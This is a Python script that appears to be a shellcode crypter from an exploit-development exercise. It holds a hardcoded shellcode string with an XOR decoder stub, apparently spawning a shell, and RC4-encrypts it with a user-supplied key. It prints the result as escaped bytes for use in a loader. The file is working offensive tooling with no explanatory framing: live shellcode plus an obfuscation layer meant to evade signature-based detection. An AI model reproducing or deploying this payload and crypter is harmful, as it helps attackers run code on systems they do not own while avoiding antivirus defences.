#!/usr/bin/python

from __future__ import print_function
import sys

# globals
MAX_ARRAY_LEN = 256
keystream = []
rc4_i = None
rc4_j = None
shellcode = (\
"\xeb\x0b\x5e\x80\x36\xaa\x74\x0a\x48\xff\xc6\xeb\xf6\xe8\xf0\xff\xff\xff\xe2\x9b\x6a\xe2\x9b\x71\x1a\x91\xf9\xe2\x13\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xfb\xe2\x23\x4d\xf9\xfd\xe2\x23\x4c\xf9\xe2\x23\x48\xa5\xaf\xaa")

# function definitions
def main(key):
	encryption_key = key
	encryption_key_len = len(key)
	
	if encryption_key_len > MAX_ARRAY_LEN:
		print("[!] Key too big. Should be <= 256 characters")
		print( "[!] Exiting...")
		sys.exit(1)
	
	RC4_init()
	RC4_KSA(encryption_key, encryption_key_len)
	
	#shellcode_len = len(shellcode)
	
	for byte in bytearray(shellcode):			# byte references each element of the array
		
		keystream_byte = RC4_PRNG()
		
		encrypted_byte = byte ^ keystream_byte

		print("\\x%02x" %encrypted_byte, end="")
		

def RC4_init():
	global rc4_i, rc4_j, keystream

	for i in range(0, 256):
		keystream.append(i)
	rc4_i = rc4_j = 0

def RC4_KSA(key, key_len):
	global rc4_i, rc4_j, keystream

	for rc4_i in range(0, MAX_ARRAY_LEN):
		rc4_j = (rc4_j + keystream[rc4_i] + ord(key[rc4_i % key_len])) % MAX_ARRAY_LEN
		swap(rc4_i, rc4_j)
	
	rc4_i = rc4_j = 0	

def RC4_PRNG():
	global rc4_i, rc4_j, keystream
	rc4_i = (rc4_i + 1) % MAX_ARRAY_LEN
	rc4_j = (rc4_j + keystream[rc4_i]) % MAX_ARRAY_LEN

	swap(rc4_i, rc4_j)
	
	return keystream[(keystream[rc4_i] + keystream[rc4_j]) % MAX_ARRAY_LEN]

def swap(ele1, ele2):
	global rc4_i, rc4_j, keystream
	temp = keystream[ele1]
	keystream[ele1] = keystream[ele2]		
	keystream[ele2] = temp

# script execution
if __name__ == "__main__":
	if len(sys.argv) < 2 or len(sys.argv) > 2:
		print("[!] Please input a key that is between 1 ~ 256 characters")
		print("[!] Exiting...")
		sys.exit(1)

	# could also check the input key as well
	main(sys.argv[1])
